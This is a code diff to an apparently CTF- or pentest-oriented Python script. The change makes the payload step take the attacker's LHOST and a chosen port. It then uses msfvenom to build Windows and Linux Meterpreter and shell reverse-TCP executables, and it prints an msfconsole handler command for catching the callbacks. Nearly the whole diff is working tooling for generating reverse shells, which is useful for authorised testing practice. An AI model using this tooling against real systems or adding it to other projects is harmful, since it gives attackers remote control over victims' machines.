@@ -45,8 +45,14 @@ def nmap_scan_choice(machine_ip, base_dir):
     except subprocess.CalledProcessError as e:
         print(f"Error during Nmap scan: {e}")
 
-def generate_payloads(machine_ip, machine_type, base_dir):
-    """Generate payloads based on the machine type and Nmap scan results."""
+def generate_payloads(lhost_ip, machine_type, base_dir):
+    """Generate payloads based on the machine type and Nmap scan results.
+    
+    Args:
+        lhost_ip: The attacker's IP (LHOST) to connect back to
+        machine_type: The target machine type (Windows/Linux)
+        base_dir: The base directory for payload output
+    """
     payloads_dir = os.path.join(base_dir, "payloads")
     if not os.path.exists(payloads_dir):
         os.makedirs(payloads_dir)
@@ -56,20 +62,42 @@ def generate_payloads(machine_ip, machine_type, base_dir):
         print("Error: msfvenom not found. Please install Metasploit Framework.")
         return
     
+    # Get listening port
+    lport = input("Enter the listening port for payloads (default: 4444): ").strip() or "4444"
+    
     # Determine which payloads to generate based on the machine type
     if machine_type == "Windows":
-        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f exe > {payloads_dir}/windows_payload.exe"
+        print(f"Generating Windows payloads with LHOST={lhost_ip} LPORT={lport}")
+        # Windows Meterpreter reverse TCP
+        payload_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe > {payloads_dir}/windows_meterpreter.exe"
+        subprocess.run(payload_cmd, shell=True)
+        
+        # Windows shell reverse TCP
+        payload_cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe > {payloads_dir}/windows_shell.exe"
+        subprocess.run(payload_cmd, shell=True)
+        
     elif machine_type == "Linux":
-        payload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f elf > {payloads_dir}/linux_payload.elf"
+        print(f"Generating Linux payloads with LHOST={lhost_ip} LPORT={lport}")
+        # Linux Meterpreter reverse TCP
+        payload_cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf > {payloads_dir}/linux_meterpreter.elf"
+        subprocess.run(payload_cmd, shell=True)
+        
+        # Linux shell reverse TCP
+        payload_cmd = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf > {payloads_dir}/linux_shell.elf"
+        subprocess.run(payload_cmd, shell=True)
+        
     else:
-        print("Unknown machine type. Cannot generate payload.")
-        return
-
-    # Generate the payload
-    try:
-        subprocess.run(payload, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error during payload generation: {e}")
+        print(f"Unknown machine type: {machine_type}")
+        print("Generating generic payloads...")
+        # Generate both Windows and Linux payloads
+        payload_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f exe > {payloads_dir}/windows_meterpreter.exe"
+        subprocess.run(payload_cmd, shell=True)
+        payload_cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost_ip} LPORT={lport} -f elf > {payloads_dir}/linux_meterpreter.elf"
+        subprocess.run(payload_cmd, shell=True)
+    
+    print(f"\nPayloads saved to: {payloads_dir}")
+    print(f"To set up a listener, run:")
+    print(f"  msfconsole -q -x 'use exploit/multi/handler; set payload <payload_type>; set LHOST {lhost_ip}; set LPORT {lport}; run'")
 
 def advanced_nmap_scan(machine_ip, machine_type, base_dir):
     nmap_dir = os.path.join(base_dir, "nmap")
